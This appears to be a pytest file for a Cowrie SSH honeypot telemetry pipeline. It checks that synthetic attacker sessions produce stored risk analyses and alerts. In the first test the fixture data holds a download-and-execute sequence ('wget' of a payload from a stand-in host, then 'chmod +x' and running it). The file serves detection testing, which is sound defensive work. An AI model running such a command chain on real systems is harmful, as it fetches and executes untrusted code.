
import json
from threading import Event

from core.events.model import MorpheusEvent
from telemetry.cowrie.pipeline import run_cowrie_pipeline
import telemetry.cowrie.live_pipeline as live_pipeline


def _read_events(storage_path):
    return [
        json.loads(line)
        for line in storage_path.read_text(encoding="utf-8").splitlines()
        if line.strip()
    ]


def test_offline_pipeline_persists_qualifying_alert(tmp_path):
    log_path = tmp_path / "cowrie.json"
    storage_path = tmp_path / "events.jsonl"
    session_id = "alert-offline-integration"

    raw_events = [
        {
            "eventid": "cowrie.session.connect",
            "timestamp": "2026-10-16T10:00:00+00:00",
            "session": session_id,
            "src_ip": "192.0.2.25",
            "protocol": "ssh",
        },
        {
            "eventid": "cowrie.command.input",
            "timestamp": "2026-10-16T10:00:01+00:00",
            "session": session_id,
            "input": "wget http://example.test/payload",
        },
        {
            "eventid": "cowrie.command.input",
            "timestamp": "2026-10-16T10:00:02+00:00",
            "session": session_id,
            "input": "chmod +x payload",
        },
        {
            "eventid": "cowrie.command.input",
            "timestamp": "2026-10-16T10:00:03+00:00",
            "session": session_id,
            "input": "./payload",
        },
        {
            "eventid": "cowrie.session.closed",
            "timestamp": "2026-10-16T10:00:04+00:00",
            "session": session_id,
            "duration_ms": 4000,
        },
    ]

    log_path.write_text(
        "".join(json.dumps(event) + "\n" for event in raw_events),
        encoding="utf-8",
    )

    processed_count = run_cowrie_pipeline(
        log_path=str(log_path),
        storage_path=str(storage_path),
        alert_minimum_severity="medium",
    )

    stored_events = _read_events(storage_path)
    analyses = [
        event for event in stored_events
        if event["event_type"] == "morpheus.intelligence.analysis"
    ]
    alerts = [
        event for event in stored_events
        if event["event_type"] == "morpheus.alert.created"
    ]

    assert processed_count == len(raw_events)
    assert len(analyses) == 1
    assert analyses[0]["data"]["risk_assessment"]["score"] >= 30
    assert len(alerts) == 1
    assert alerts[0]["data"]["session_id"] == session_id
    assert alerts[0]["data"]["severity"] in ("medium", "high", "critical")
    assert alerts[0]["data"]["risk_score"] >= 30


def test_live_pipeline_persists_alert_from_analysis(tmp_path, monkeypatch):
    log_path = tmp_path / "cowrie.json"
    storage_path = tmp_path / "live-events.jsonl"
    log_path.write_text("", encoding="utf-8")

    session_id = "alert-live-integration"

    class FakeFollower:
        def __init__(
            self,
            log_path,
            event_bus,
            poll_interval,
            start_at_end,
        ):
            self.event_bus = event_bus

        def run(self, stop_event):
            analysis = {
                "session": {
                    "session_id": session_id,
                    "source_ip": "192.0.2.50",
                },
                "risk_assessment": {
                    "session_id": session_id,
                    "source_ip": "192.0.2.50",
                    "severity": "critical",
                    "score": 90,
                    "factors": [
                        {
                            "name": "integration_test",
                            "description": "Synthetic test risk factor",
                        }
                    ],
                },
                "intents": [],
                "mitre_techniques": [],
                "recommended_actions": [],
            }

            self.event_bus.publish(
                MorpheusEvent(
                    event_type="morpheus.intelligence.analysis",
                    source="morpheus",
                    data=analysis,
                    timestamp="2026-10-16T10:00:00+00:00",
                )
            )

    monkeypatch.setattr(
        live_pipeline,
        "CowrieLogFollower",
        FakeFollower,
    )

    live_pipeline.run_live_cowrie_pipeline(
        log_path=str(log_path),
        storage_path=str(storage_path),
        stop_event=Event(),
    )

    stored_events = _read_events(storage_path)
    analyses = [
        event for event in stored_events
        if event["event_type"] == "morpheus.intelligence.analysis"
    ]
    alerts = [
        event for event in stored_events
        if event["event_type"] == "morpheus.alert.created"
    ]

    assert len(analyses) == 1
    assert len(alerts) == 1

    alert = alerts[0]["data"]
    assert alert["session_id"] == session_id
    assert alert["severity"] == "critical"
    assert alert["risk_score"] == 90
    assert alert["source_ip"] == "192.0.2.50"
